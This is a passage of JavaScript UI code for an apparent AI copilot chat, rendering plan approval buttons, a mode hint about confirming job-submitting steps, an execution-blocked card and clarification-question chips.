    _renderPlanActionBlock: function (parentNode, planData, planCard) {
      var self = this;
      var planStatus = planData.status || 'draft';

      var actionBlock = domConstruct.create('div', {
        'class': 'plan-action-block'
      }, parentNode);

      if (planStatus !== 'draft') {
        // Plan already acted on — show completed state
        var completedLabel = planStatus === 'approved' || planStatus === 'executing' || planStatus === 'completed'
          ? 'Plan approved'
          : planStatus === 'failed'
            ? 'Plan failed'
            : 'Plan ' + planStatus;
        domConstruct.create('span', {
          'class': 'plan-action-block-completed',
          innerHTML: '\u2705 ' + completedLabel
        }, actionBlock);
        return;
      }

      var approveBtn = domConstruct.create('button', {
        'class': 'plan-card-btn plan-card-btn-primary',
        innerHTML: 'Approve & Execute'
      }, actionBlock);

      var editBtn = domConstruct.create('button', {
        'class': 'plan-card-btn plan-card-btn-secondary',
        innerHTML: 'Edit Plan'
      }, actionBlock);

      var regenBtn = domConstruct.create('button', {
        'class': 'plan-card-btn plan-card-btn-secondary',
        innerHTML: 'Regenerate'
      }, actionBlock);

      // D4 Phase 3: plans run in either mode.  In Plan mode a step that
      // creates a group or submits a job pauses and asks first; the hint
      // says so (it is hidden in Execute mode).
      var modeHint = domConstruct.create('div', {
        'class': 'plan-action-block-hint',
        innerHTML: 'Steps that create a group or submit a job will ask you before they run.'
      }, actionBlock);

      function applyMode(mode) {
        modeHint.style.display = mode === 'execute' ? 'none' : '';
      }
      applyMode(window.App && window.App.copilotExecutionMode);
      var modeHandle = topic.subscribe('CopilotExecutionModeChanged', function (data) {
        if (!actionBlock.isConnected) { modeHandle.remove(); return; }
        applyMode(data && data.mode);
      });

      // Replace the action block content with a completed state
      function setCompleted(label) {
        domConstruct.empty(actionBlock);
        domConstruct.create('span', {
          'class': 'plan-action-block-completed',
          innerHTML: '\u2705 ' + label
        }, actionBlock);
      }

      on(approveBtn, 'click', function () {
        modeHandle.remove();
        setCompleted('Plan approved');
        planCard._approvePlan();
      });

      on(editBtn, 'click', function () {
        // Hide (not replace) the buttons: the plan is still a draft after
        // Save Changes or Cancel, so Approve must come back.
        actionBlock.style.display = 'none';
        planCard.onEditDone = function () {
          actionBlock.style.display = '';
        };
        planCard._mode = 'edit';
        planCard._render();
      });

      on(regenBtn, 'click', function () {
        setCompleted('Regenerating plan');
        topic.publish('CopilotPlanRegenerate', {
          plan: planData,
          sessionId: self.message.session_id || self.sessionId || null
        });
      });
    },

    /**
     * Render the ExecutionBlockedCard for a plan-mode refusal.
     * @param {HTMLElement} parentNode - The message content node to append to.
     */
    renderExecutionBlockedCard: function (parentNode) {
      try {
        var payload = (this.message.card && this.message.card.card_payload) || {};
        var card = new ExecutionBlockedCard({
          agent: payload.agent || null,
          blockedActions: payload.blocked_actions || [],
          originalQuery: payload.original_query || '',
          sessionId: this.message.session_id || this.sessionId || null,
          copilotApi: this.copilotApi || null,
          // Recorded by the gateway on the first answer; renders read-only.
          answered: payload.answered || null,
          planContext: payload.plan_context || null,
          // The card records its answer here too, so a re-render of this
          // message (a plan's next step redraws the chat) keeps it.
          cardPayload: payload
        });
        var container = domConstruct.create('div', {
          'class': 'execution-blocked-card-container'
        }, parentNode);
        card.placeAt(container);
        card.startup();
      } catch (e) {
        console.error('[ChatMessage] Error rendering execution blocked card:', e);
      }
    },

    /**
     * Render ClarificationChips widget for an agent's clarification questions.
     * @param {HTMLElement} parentNode - The message content node to append to.
     */
    renderClarificationChips: function (parentNode) {
      try {
        // Live: clarificationData (set while streaming).  After a reload:
        // the stored card's payload.  Already answered (a later "Answered
        // Questions" message exists, see CopilotDisplay.showMessages): the
        // answers are shown there, so no chips.
        if (this.message.clarificationAnswered) {
          return;
        }
        var clarData = this.message.clarificationData ||
          (this.message.card && this.message.card.card_payload);
        if (!clarData || !clarData.questions || clarData.questions.length === 0) {
          console.warn('[ChatMessage] renderClarificationChips called without valid data');
          return;
        }

        var chips = new ClarificationChips({
          questions: clarData.questions,
          agent: clarData.agent || 'planning',
          planStep: clarData.plan_step || null,
          sessionId: this.message.session_id || this.sessionId || null,
          originalQuery: this.message.originalQuery || ''
        });

        var chipsContainer = domConstruct.create('div', {
          'class': 'clarification-chips-container'
        }, parentNode);

        chips.placeAt(chipsContainer);
        chips.startup();
      } catch (e) {
        console.error('[ChatMessage] Error rendering clarification chips:', e);
      }
    }
  });
});
